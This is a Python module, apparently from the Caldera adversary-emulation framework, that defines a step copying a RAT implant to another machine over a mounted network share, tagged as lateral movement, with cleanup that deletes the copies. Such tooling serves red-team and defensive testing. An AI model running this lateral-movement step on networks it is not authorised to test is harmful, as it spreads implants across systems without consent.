from plugins.adversary.app.commands import cmd
from plugins.adversary.app.operation.operation import Step, OPFile, OPRat, OPVar, OPShare


class Copy(Step):
    """
    Description:
        This step copies a file, specifically the Caldera RAT, between machines.
    Requirements:
        Requires a share to have been created on the target machine, which is usually accomplished using NetUse.
    """
    attack_mapping = [('T1105', 'Lateral Movement'), ('T1106', 'Execution')]
    display_name = "copy_file"
    summary = "Copy a file from a computer to another using a mounted network share"

    preconditions = [("rat", OPRat),
                     ("share", OPShare({"src_host": OPVar("rat.host")}))]
    postconditions = [("file_g", OPFile({'host': OPVar("share.dest_host")}))]

    preproperties = ['rat.executable', 'share.share_path']

    postproperties = ['file_g.path']

    deterministic = True

    cddl = """
    Knowns:
        rat: OPRat[host, executable]
        share: OPShare[src_host, dest_host, share_path]
    Where:
        rat.host == share.src_host
        rat.host != share.dest_host
    Effects:
        if not exist rat {
            forget rat
        } else {
            create OPFile[path="somepath", host=share.dest_host]
        }
    """

    @staticmethod
    def description(rat, share):
        return "Copying an implant from {} to {}".format(rat.host.fqdn, share.dest_host.fqdn)

    @staticmethod
    async def action(operation, rat, share, file_g):
        filepath = "\\" + operation.adversary_artifactlist.get_executable_word()
        await operation.execute_shell_command(rat, *cmd.copy(rat.executable, share.share_path + filepath))
        await file_g({'src_host': share.src_host, 'src_path': rat.executable, 'path': share.mount_point + filepath,
                      'use_case': 'rat'})
        return True

    @staticmethod
    async def cleanup(cleaner, file_g):
        for file in file_g:
            await cleaner.delete(file)
